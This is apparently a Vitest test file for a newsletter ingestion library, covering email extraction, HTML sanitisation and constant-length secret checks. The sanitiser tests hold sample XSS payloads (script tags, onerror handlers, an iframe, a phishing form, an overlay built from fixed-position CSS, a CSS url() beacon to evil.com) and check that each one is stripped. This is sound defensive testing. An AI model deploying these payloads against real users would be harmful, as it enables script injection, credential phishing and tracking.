import { describe, it, expect } from "vitest";
import {
  extractEmail,
  sanitizeNewsletterHtml,
  verifyIngestSecret,
} from "../lib/newsletter-ingest.js";

describe("extractEmail", () => {
  it("extracts email from angle bracket format", () => {
    expect(extractEmail("Dan <dan@example.com>")).toBe("dan@example.com");
  });

  it("returns plain email as-is (lowercased)", () => {
    expect(extractEmail("dan@example.com")).toBe("dan@example.com");
  });

  it("lowercases uppercase emails", () => {
    expect(extractEmail("UPPER@EXAMPLE.COM")).toBe("upper@example.com");
  });

  it("handles display name with angle brackets and uppercase", () => {
    expect(extractEmail("TLDR Tech <NEWS@tldr.tech>")).toBe("news@tldr.tech");
  });
});

describe("sanitizeNewsletterHtml", () => {
  it("preserves basic formatting and links", () => {
    const html = '<p>Hello <strong>world</strong> <a href="https://example.com">link</a></p>';
    const result = sanitizeNewsletterHtml(html);
    expect(result).toContain("<p>");
    expect(result).toContain("<strong>world</strong>");
    expect(result).toContain('href="https://example.com"');
  });

  it("preserves table layout (newsletters use tables heavily)", () => {
    const html = '<table><tr><td style="width:50%">Left</td><td>Right</td></tr></table>';
    const result = sanitizeNewsletterHtml(html);
    expect(result).toContain("<table>");
    expect(result).toContain("<td");
    expect(result).toContain("Left");
  });

  it("strips script tags", () => {
    const html = '<p>Safe</p><script>alert("xss")</script>';
    const result = sanitizeNewsletterHtml(html);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert");
    expect(result).toContain("Safe");
  });

  it("strips iframe tags", () => {
    const html = '<p>Safe</p><iframe src="https://evil.com"></iframe>';
    const result = sanitizeNewsletterHtml(html);
    expect(result).not.toContain("<iframe");
  });

  it("strips event handler attributes", () => {
    const html = '<img src="x.jpg" onerror="alert(1)">';
    const result = sanitizeNewsletterHtml(html);
    expect(result).not.toContain("onerror");
  });

  it("strips form elements", () => {
    const html = '<form action="/steal"><input type="text"><button>Submit</button></form>';
    const result = sanitizeNewsletterHtml(html);
    expect(result).not.toContain("<form");
    expect(result).not.toContain("<input");
    expect(result).not.toContain("<button");
  });

  it("strips dangerous CSS properties from inline styles", () => {
    const html = '<div style="position:fixed;top:0;left:0;z-index:9999;width:100%">overlay</div>';
    const result = sanitizeNewsletterHtml(html);
    expect(result).not.toContain("position");
    expect(result).not.toContain("z-index");
    // width should be preserved
    expect(result).toContain("width");
  });

  it("strips dangerous CSS from single-quoted style attributes", () => {
    const html = "<div style='position:fixed;z-index:9999;width:50%'>overlay</div>";
    const result = sanitizeNewsletterHtml(html);
    expect(result).not.toContain("position");
    expect(result).not.toContain("z-index");
  });

  it("strips url() from CSS to prevent data exfiltration", () => {
    const html = '<div style="background:url(https://evil.com/track?id=123)">test</div>';
    const result = sanitizeNewsletterHtml(html);
    expect(result).not.toContain("url(");
  });

  it("forces links to open in new tab", () => {
    const html = '<a href="https://example.com">link</a>';
    const result = sanitizeNewsletterHtml(html);
    expect(result).toContain('target="_blank"');
    expect(result).toContain('rel="noopener noreferrer"');
  });

  it("falls back to text wrapped in pre when no HTML", () => {
    const result = sanitizeNewsletterHtml("", "Plain text newsletter content");
    expect(result).toContain("<pre");
    expect(result).toContain("Plain text newsletter content");
  });

  it("returns empty string when both htmlBody and textBody are empty", () => {
    expect(sanitizeNewsletterHtml("")).toBe("");
    expect(sanitizeNewsletterHtml("", null)).toBe("");
  });

  it("escapes HTML entities in text fallback", () => {
    const result = sanitizeNewsletterHtml("", "<script>alert('xss')</script>");
    expect(result).toContain("&lt;script&gt;");
    expect(result).not.toContain("<script>");
  });

  it("strips object/embed tags", () => {
    const html = '<object data="x.swf"></object><embed src="x.swf">';
    const result = sanitizeNewsletterHtml(html);
    expect(result).not.toContain("<object");
    expect(result).not.toContain("<embed");
  });

  it("strips style tags (not inline styles)", () => {
    const html = '<style>body { color: red; }</style><p>Content</p>';
    const result = sanitizeNewsletterHtml(html);
    expect(result).not.toContain("<style");
    expect(result).toContain("Content");
  });
});

describe("verifyIngestSecret", () => {
  it("returns true for matching secrets", () => {
    expect(verifyIngestSecret("my-secret-123", "my-secret-123")).toBe(true);
  });

  it("returns false for wrong secret", () => {
    expect(verifyIngestSecret("wrong-secret", "my-secret-123")).toBe(false);
  });

  it("returns false for different length secrets", () => {
    expect(verifyIngestSecret("short", "much-longer-secret")).toBe(false);
  });
});
